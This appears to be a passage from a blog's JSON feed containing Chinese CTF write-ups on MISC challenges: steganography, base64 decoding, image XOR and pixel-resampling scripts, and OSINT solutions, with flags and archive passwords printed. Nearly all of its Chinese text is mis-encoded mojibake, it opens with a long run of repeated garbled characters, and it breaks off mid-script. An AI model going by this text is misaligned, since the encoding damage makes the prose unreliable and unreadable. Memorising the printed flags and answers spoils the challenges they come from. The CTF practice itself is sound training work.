Âïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïä‰Ω†Ë°å‰∏çË°åÂïäË°å‰∏çË°åÂïäË°å‰∏çË°åÂïä\n\ndoEs_not_re@d_t\n</code></pre>\n<p>ÂæóÂà∞‰∏§‰∏≤ flag</p>\n<p>Â∞ÜÂÖ∂‰øÆÊîπÂéãÁº©ÂåÖÂêéÁºÄÂêç</p>\n<blockquote>\n<p>document.xml</p>\n</blockquote>\n<blockquote>\n<p>He_3_Kinggggdoms}</p>\n</blockquote>\n<p>ÊãºÂáëÂæóÂà∞ flag</p>\n<h3 id=\"ez-osint\"><a class=\"markdownIt-Anchor\" href=\"#ez-osint\">#</a> ez-osint</h3>\n<p>ÁôæÂ∫¶ÊêúÂõæÁõ¥Êé•ËÆ≤Ëß£Ôºå8Ôºö35-8Ôºö45</p>\n<h3 id=\"‰∏∫‰ªÄ‰πà‰∏çÊç¢Êç¢ÊÄùË∑ØÊçè\"><a class=\"markdownIt-Anchor\" href=\"#‰∏∫‰ªÄ‰πà‰∏çÊç¢Êç¢ÊÄùË∑ØÊçè\">#</a> ‰∏∫‰ªÄ‰πà‰∏çÊç¢Êç¢ÊÄùË∑ØÊçè</h3>\n<pre><code>ÂØÜÊñáÔºö3956305A7652305877676D656E3532626F395664776B3358723557596F52335835423055375A4556444E6C52\n</code></pre>\n<p><img data-src=\"/img/fsctfwppic/4.png\" alt=\"image-20231024083859306\"></p>\n<h3 id=\"ÊúÄÁªàËØïÁÇºhhh\"><a class=\"markdownIt-Anchor\" href=\"#ÊúÄÁªàËØïÁÇºhhh\">#</a> ÊúÄÁªàËØïÁÇº hhh</h3>\n<p>ÂéãÁº©ÂåÖÊñá‰ª∂ÈÄÜÂ∫èÔºåÂÜôËÑöÊú¨‰øÆÊîπ‰∏Ä‰∏ã</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">reverse_hex</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span>file_path<span class=\"token punctuation\">,</span> <span class=\"token string\">'rb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>        hex_data <span class=\"token operator\">=</span> f<span class=\"token punctuation\">.</span>read<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span><span class=\"token builtin\">hex</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>    reversed_hex <span class=\"token operator\">=</span> <span class=\"token string\">''</span><span class=\"token punctuation\">.</span>join<span class=\"token punctuation\">(</span><span class=\"token builtin\">reversed</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">[</span>hex_data<span class=\"token punctuation\">[</span>i<span class=\"token punctuation\">:</span> i<span class=\"token operator\">+</span><span class=\"token number\">2</span><span class=\"token punctuation\">]</span> <span class=\"token keyword\">for</span> i <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>hex_data<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>    <span class=\"token keyword\">with</span> <span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'1.zip'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'wb'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">as</span> f<span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>        f<span class=\"token punctuation\">.</span>write<span class=\"token punctuation\">(</span><span class=\"token builtin\">bytes</span><span class=\"token punctuation\">.</span>fromhex<span class=\"token punctuation\">(</span>reversed_hex<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>reverse_hex<span class=\"token punctuation\">(</span><span class=\"token string\">'flag'</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p>ÂæóÂà∞ 1.zip</p>\n<p>ÈáåÈù¢Êúâ‰∏™ pdf ÊñáÊ°£ÔºåÂà©Áî®Â∑•ÂÖ∑ wbStego4.3open Êó†ÂØÜÁ†ÅËß£ÂØÜÂç≥ÂèØ</p>\n<h3 id=\"Â§úÊ∑±‰∫∫ÈùôÁöÑÊó∂ÂÄô‰πü‰ºöÂÅ∑ÂÅ∑emo\"><a class=\"markdownIt-Anchor\" href=\"#Â§úÊ∑±‰∫∫ÈùôÁöÑÊó∂ÂÄô‰πü‰ºöÂÅ∑ÂÅ∑emo\">#</a> Â§úÊ∑±‰∫∫ÈùôÁöÑÊó∂ÂÄô‰πü‰ºöÂÅ∑ÂÅ∑ emo</h3>\n<p>ÂéãÁº©ÂåÖÂØÜÁ†ÅÔºö12345</p>\n<p CemMEnt_Se@1s_tHe_heaaaaaart_foR_An0ther_D@y=\"\">MP3Stego ÈöêÂÜô ÔºöFSCTF</p>\n",
            "tags": [
                "wp"
            ]
        },
        {
            "id": "http://example.com/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "url": "http://example.com/2023/10/24/%E6%9E%81%E5%AE%A2wp/",
            "title": "ÊûÅÂÆ¢wp",
            "date_published": "2023-10-24T01:31:05.000Z",
            "content_html": "<h1 id=\"ÊûÅÂÆ¢Â§ßÊåëÊàòwp\"><a class=\"markdownIt-Anchor\" href=\"#ÊûÅÂÆ¢Â§ßÊåëÊàòwp\">#</a> ÊûÅÂÆ¢Â§ßÊåëÊàò ‚Äî‚Äî‚Äîwp</h1>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> MISC</h2>\n<h3 id=\"cheekin\"><a class=\"markdownIt-Anchor\" href=\"#cheekin\">#</a> cheekin</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/1.png\" alt=\"image-20231029201202053\"></p>\n<h3 id=\"ez_smilemo\"><a class=\"markdownIt-Anchor\" href=\"#ez_smilemo\">#</a> ez_smilemo</h3>\n<p>‰∏äÁΩëËá™Ë°åÊêúÁ¥¢ data.win ÊÄé‰πàÊâìÂºÄ„ÄÇ</p>\n<p>ÊâæÂà∞Â∑•ÂÖ∑ UndertaleModTool.exe</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/2.png\" alt=\"image-20231029201510600\"></p>\n<blockquote>\n<p>c20xbGVfMXNfQF9uMWNlX2dAbWU=</p>\n</blockquote>\n<p>Ëß£Á†Å base64 ÂæóÂà∞ flag :&gt; sm1le_1s_@_n1ce_g@me</p>\n<h3 id=\"death_n0te\"><a class=\"markdownIt-Anchor\" href=\"#death_n0te\">#</a> DEATH_N0TE</h3>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/kamisama.png\" alt=\"kamisama\"></p>\n<p>È¢òÁõÆÂ¶Ç‰∏äÔºÅ</p>\n<p>ÂæàÊòéÊòæËÉΩÂèëÁé∞ÊúâÂÉèÁ¥†ÁÇπÁØ°Êîπ„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'kamisama.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>width<span class=\"token punctuation\">,</span> height <span class=\"token operator\">=</span> image<span class=\"token punctuation\">.</span>size</pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>image_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>image<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>extracted_pixels <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>        pixel <span class=\"token operator\">=</span> <span class=\"token builtin\">tuple</span><span class=\"token punctuation\">(</span>image_array<span class=\"token punctuation\">[</span>y<span class=\"token punctuation\">,</span> x<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre>        extracted_pixels<span class=\"token punctuation\">.</span>append<span class=\"token punctuation\">(</span>pixel<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>width1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> width<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>height1 <span class=\"token operator\">=</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span><span class=\"token number\">5</span><span class=\"token punctuation\">,</span> height<span class=\"token punctuation\">,</span> <span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>img <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>new<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">,</span> <span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">,</span> height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>pixels <span class=\"token operator\">=</span> img<span class=\"token punctuation\">.</span>load<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>index <span class=\"token operator\">=</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre><span class=\"token keyword\">for</span> y <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>height1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    <span class=\"token keyword\">for</span> x <span class=\"token keyword\">in</span> <span class=\"token builtin\">range</span><span class=\"token punctuation\">(</span>width1<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>        img<span class=\"token punctuation\">.</span>putpixel<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">,</span> y<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> extracted_pixels<span class=\"token punctuation\">[</span>index<span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>        index <span class=\"token operator\">+=</span> <span class=\"token number\">1</span></pre></td></tr><tr><td data-num=\"26\"></td><td><pre></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>img<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"1.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>img<span class=\"token punctuation\">.</span>show<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/3.png\" alt=\"1\"></p>\n<p>Âì•ÁâπË°®ÁöÑ base64</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/7.png\" alt=\"img\"></p>\n<p>ËøõË°åÂØπÂ∫îÔºöTkFNRV9oMnRha3VYWH0=</p>\n<p>Ëß£ÂØÜÔºö NAME_h2takuXX}</p>\n<p>Á¨¨‰∏ÄÊÆµÔºö</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/8.png\" alt=\"image-20231029203349480\"></p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/9.png\" alt=\"image-20231029203523790\"></p>\n<h3 id=\"‰∏ã‰∏ÄÁ´ôÊòØÂì™ÂÑøÂë¢\"><a class=\"markdownIt-Anchor\" href=\"#‰∏ã‰∏ÄÁ´ôÊòØÂì™ÂÑøÂë¢\">#</a> ‰∏ã‰∏ÄÁ´ôÊòØÂì™ÂÑøÂë¢</h3>\n<p>ÊàëÂíå yxx ÂéªÊóÖÊ∏∏ÔºåÂâç‰∏ÄÂ§©ËøòÂ•ΩÂ•ΩÁöÑÔºåÁé©ÂÆå„ÄäÊåáÊå•ÂÆòÂü∫ÊÅ©„ÄãËøô‰∏™Ê∏∏ÊàèÂ∞±Áù°Ëßâ‰∫ÜÔºåÁ¨¨‰∫åÂ§©Êôö‰∏äÂêÉÂÆåÈ•≠Â•π‰∫∫Â∞±‰∏çËßÅ‰∫ÜÔºåËµ∞‰πãÂâçÁïô‰∏ã‰∫Ü‰∏§Âº†ÂõæÁâáÂ∞±Ê∂àÂ§±‰∫Ü„ÄÇ‰Ω†ËÉΩÂ∏ÆÊàëÊâæÊâæÂ•πÂùêÂì™‰∏™Ëà™Áè≠ÂéªÂì™‰∏™Âú∞Êñπ‰∫ÜÂòõÔºü  flag Ê†ºÂºèÔºöSYC {Ëà™Áè≠Âè∑_ÂüéÂ∏ÇÊãºÈü≥}ÔºåÂüéÂ∏ÇÊãºÈü≥È¶ñÂ≠óÊØçÂ§ßÂÜôÂô¢</p>\n<p>ÈôÑ‰ª∂ÁªôÁöÑÊå∫ÂÖ®ÔºåËØ¥ÊòØÁ§æÂ∑•ÔºåÂÖ∂ÂÆûÊúâÂõæÁâáÈöêÂÜôÁöÑÂú∞Êñπ</p>\n<p>1.jpg ‚Äî&gt; ÊèêÂèñÂá∫ÂéãÁº©ÂåÖÂÜÖÊñá‰ª∂</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/10.png\" alt=\"image-20231029203951251\"></p>\n<p>secret.png ÊòØÈì∂Ê≤≥Ë°®ÂØπÂ∫î</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/secret.png\" alt=\"secret\"></p>\n<p>I wang to go liquor city ÂÖ≥ÈîÆÁ∫øÁ¥¢ÊòØÁôΩÈÖíÂüé  ÂÆö‰ΩçÂà∞ÂõõÂ∑ùÊ≥∏Â∑ûÔºåÊú∫Âú∫ÊòØÊ≥∏Â∑ûÁôΩ‰∫ë</p>\n<p>ÁªìÂêàËÅäÂ§©ËÆ∞ÂΩïÔºåÁü•ÈÅì 20.00 Â∑¶Âè≥ÁöÑÈ£ûÊú∫ÔºåÂá∫ÂèëÁÇπÊòØÊ∑±Âú≥ÂÆùÂÆâÂõΩÈôÖÊú∫Âú∫</p>\n<p>‰ΩøÁî®ËΩØ‰ª∂ÊêúÁ¥¢ÔºöÂÆö‰ΩçËà™Áè≠ CZ8579  ÊïÖ flag ‰∏∫ CZ8579_Luzhou</p>\n<h3 id=\"qingwanÂøÉÈÉΩË¶ÅÁ¢é‰∫Ü\"><a class=\"markdownIt-Anchor\" href=\"#qingwanÂøÉÈÉΩË¶ÅÁ¢é‰∫Ü\">#</a> Qingwan ÂøÉÈÉΩË¶ÅÁ¢é‰∫Ü</h3>\n<p Âú∞ÁÇπÂêçÂ≠ó=\"\">Qingwan Âíå Yxx ‰∏ÄËµ∑ÂéªÊóÖÊ∏∏Ôºå‰ΩÜÊòØ Qingwan Áù°ÁöÑÂ§™Ê≠ªÂï¶ÔºåYxx ‰∏¢‰∏ãÂ•π‰∏Ä‰∏™‰∫∫ÂéªÁé©‰∫ÜÔºåÂ•π‰∏ÄËßâËµ∑Êù•Âè™ÁúãËßÅ Yxx ÂèëÁöÑÊúãÂèãÂúàÔºåËÉΩÂ∏Æ Qingwan ÊâæÂà∞Â•πÂêóÔºü flag Ê†ºÂºèÔºöSYC</p>\n<p>ÁôæÂ∫¶ÊêúÂõæÔºåÂÆö‰ΩçÈáçÂ∫Ü„ÄÇÊêúÁ¥¢ÂçöÁâ©È¶ÜÔºåÁ¨¨‰∏Ä‰∏™Â∞±ÊòØÈáçÂ∫Ü‰∏≠ÂõΩ‰∏âÂ≥°ÂçöÁâ©È¶ÜÔºåÂæóÂà∞ flag/</p>\n<p>SYC ÈáçÂ∫Ü‰∏≠ÂõΩ‰∏âÂ≥°ÂçöÁâ©È¶Ü}</p>\n<h3 id=\"xqr‰∏ÄË°Ä\"><a class=\"markdownIt-Anchor\" href=\"#xqr‰∏ÄË°Ä\">#</a> xqrÔºà‰∏ÄË°ÄÔºâ</h3>\n<p>Áõ¥Êé•Êâ´Á†ÅÔºåÊòØÂÅá flag„ÄÇÂàÜÊûêÊñá‰ª∂ÔºåÈáåÈù¢ËøòÊúâÂº†ÂõæÁâá„ÄÇËøõË°åÊèêÂèñ„ÄÇ</p>\n<p>ÂæóÂà∞‰∏Ä‰∏™ 25x25 ÁöÑÂõæÁâá</p>\n<p>‰∏§Âº†ÂõæÁâáÂºÇÊàñÂæóÂà∞ flag.png Êâ´Êèè‰∫åÁª¥Á†ÅÂæóÂà∞ flag„ÄÇ</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">from</span> PIL <span class=\"token keyword\">import</span> Image</pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">import</span> numpy <span class=\"token keyword\">as</span> np</pre></td></tr><tr><td data-num=\"3\"></td><td><pre></pre></td></tr><tr><td data-num=\"4\"></td><td><pre>img1 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre>img2 <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span><span class=\"token builtin\">open</span><span class=\"token punctuation\">(</span><span class=\"token string\">'xqr2.png'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>convert<span class=\"token punctuation\">(</span><span class=\"token string\">'RGB'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre></pre></td></tr><tr><td data-num=\"7\"></td><td><pre></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>img1 <span class=\"token operator\">=</span> img1<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre>img2 <span class=\"token operator\">=</span> img2<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span><span class=\"token number\">75</span><span class=\"token punctuation\">,</span> <span class=\"token number\">75</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"10\"></td><td><pre></pre></td></tr><tr><td data-num=\"11\"></td><td><pre></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>img1_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img1<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre>img2_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>array<span class=\"token punctuation\">(</span>img2<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"14\"></td><td><pre></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>result_array <span class=\"token operator\">=</span> np<span class=\"token punctuation\">.</span>bitwise_xor<span class=\"token punctuation\">(</span>img1_array<span class=\"token punctuation\">,</span> img2_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre>result_image <span class=\"token operator\">=</span> Image<span class=\"token punctuation\">.</span>fromarray<span class=\"token punctuation\">(</span>result_array<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>result_image<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>last <span class=\"token operator\">=</span> result_image<span class=\"token punctuation\">.</span>resize<span class=\"token punctuation\">(</span><span class=\"token punctuation\">(</span>result_image<span class=\"token punctuation\">.</span>height<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">,</span>result_image<span class=\"token punctuation\">.</span>width<span class=\"token operator\">*</span><span class=\"token number\">10</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>last<span class=\"token punctuation\">.</span>save<span class=\"token punctuation\">(</span><span class=\"token string\">\"22.png\"</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h3 id=\"death_n1te\"><a class=\"markdownIt-Anchor\" href=\"#death_n1te\">#</a> DEATH_N1TE</h3>\n<p>ÁªôÂá∫‰∏Ä‰∏™.mp3 Êñá‰ª∂Âíå‰∏Ä‰∏™.webp Êñá‰ª∂</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/killer.webp\" alt=\"killer\"></p>\n<p>MP3 Êñá‰ª∂ÊúÄÂ•ΩÊúâ‰∏ÄÁÇπ SSTV Èü≥È¢ëÔºåËøõË°åËØÜÂà´Âêé</p>\n<p><img data-src=\"/img/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98pic/15.png\" alt=\"2\"></p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"><span>n</span></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token keyword\">import</span> subprocess</pre></td></tr><tr><td data-num=\"2\"></td><td><pre></pre></td></tr><tr><td data-num=\"3\"></td><td><pre>input_file <span class=\"token operator\">=</span> <span class=\"token string\">\"killer.webp\"</span></pre></td></tr><tr><td data-num=\"4\"></td><td><pre></pre></td></tr><tr><td data-num=\"5\"></td><td><pre><span class=\"token comment\"># Ëé∑ÂèñÂ∏ßÊï∞</span></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>get_frames_command <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token string\">'webpmux'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">'-info'</span><span class=\"token punctuation\">,</span> input_file<span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>result <span class=\"token operator\">=</span> subprocess<span class=\"token punctuation\">.</span>run<span class=\"token punctuation\">(</span>get_frames_command<span class=\"token punctuation\">,</span> capture_output<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">,</span> text<span class=\"token operator\">=</span><span class=\"token boolean\">True</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>lines <span class=\"token operator\">=</span> result<span class=\"token punctuation\">.</span>stdout<span class=\"token punctuation\">.</span>split<span class=\"token punctuation\">(</span><span class=\"token 